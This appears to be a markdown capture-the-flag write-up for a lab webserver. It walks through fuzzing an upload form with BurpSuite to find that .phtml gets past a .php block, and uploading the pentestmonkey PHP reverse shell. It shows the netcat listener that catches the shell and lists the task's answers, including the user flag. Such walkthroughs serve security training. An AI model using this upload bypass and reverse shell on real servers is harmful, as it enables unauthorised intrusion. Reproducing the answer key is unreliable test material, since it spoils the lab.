@@ -1,0 +1,98 @@
+# Task 4 — Compromise the Webserver
+
+## Goal
+
+Exploit a file upload form in the `/internal/` directory by uploading a **PHP reverse shell** using an **allowed extension** that bypasses restrictions. Then use the shell to gain access to the system and capture the user flag.
+
+# Tools Used
+
+* **BurpSuite** – For fuzzing the upload form to test allowed extensions.
+* **PHP Reverse Shell** – For creating a backdoor to the system.
+* **Netcat (nc)** – To catch the reverse shell connection.
+
+# Part 1: Finding Allowed File Extensions (Bypass Filter)
+
+## Blocked Extension
+
+| Question                                                                         |  Answer |
+| -------------------------------------------------------------------------------- | -------- |
+| **What common file type you'd want to upload to exploit the server is blocked?** | `.php`   |
+
+## Allowed Extension
+
+| Question                                                        |  Answer |
+| --------------------------------------------------------------- | -------- |
+| **What extension is allowed after running the above exercise?** | `.phtml` |
+
+## How to Fuzz Using BurpSuite
+
+1. Upload a test file via the form on `/internal/`.
+2. Intercept the request with BurpSuite.
+3. Send it to **Intruder**.
+4. Select **Sniper** attack type.
+5. Highlight only the **extension part** of the filename (e.g., `test.§php§`).
+6. Use the following payload list (extensions):
+
+```
+.php
+.php3
+.php4
+.php5
+.phtml
+```
+
+7. Run the attack to determine which extensions are accepted.
+# Part 2: Getting a Reverse Shell
+
+## Prepare the Shell
+
+1. Download the PHP reverse shell:
+   wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+   
+2. Edit the file and set your **tun0 IP** (from `ip a` or `ifconfig`) and port `1234`:
+   ```php
+   $ip = 'YOUR_TUN0_IP';
+   $port = 1234;
+   
+3. Rename it to:
+   mv php-reverse-shell.php shell.phtml
+   
+## Set Up Listener
+
+Run a Netcat listener:
+nc -lvnp 1234
+
+## Upload & Trigger the Shell
+
+1. Upload `shell.phtml` via `/internal/`.
+2. Access it:
+
+   http://<MACHINE_IP>:3333/internal/uploads/shell.phtml
+   
+## Get Shell Access
+
+When the shell is triggered, Netcat will catch the connection:
+connect to [10.9.X.X] from (UNKNOWN) [10.10.X.X] 1234
+Linux vulnversity 4.15.0-55-generic #60-Ubuntu ...
+
+# User Enumeration
+
+Now that you're inside:
+
+whoami
+# bill
+
+ls /home/bill
+cat /home/bill/user.txt
+# 8bd7992fbe8a6ad22a63361004cfcedb
+
+## Task 4 Answers Recap
+
+| Question                                                                                   |  Answer                           |
+| ------------------------------------------------------------------------------------------ | ---------------------------------- |
+| What common file type you'd want to upload to exploit the server is blocked?               | `.php`                             |
+| I understand the Burpsuite tool and its purpose during pentesting.                         | *(No answer needed)*               |
+| What extension is allowed after running the above exercise?                                | `.phtml`                           |
+| While completing the above exercise, I have successfully downloaded the PHP reverse shell. | *(No answer needed)*               |
+| What is the name of the user who manages the webserver?                                    | `bill`                             |
+| What is the user flag?                                                                     | `8bd7992fbe8a6ad22a63361004cfcedb` |
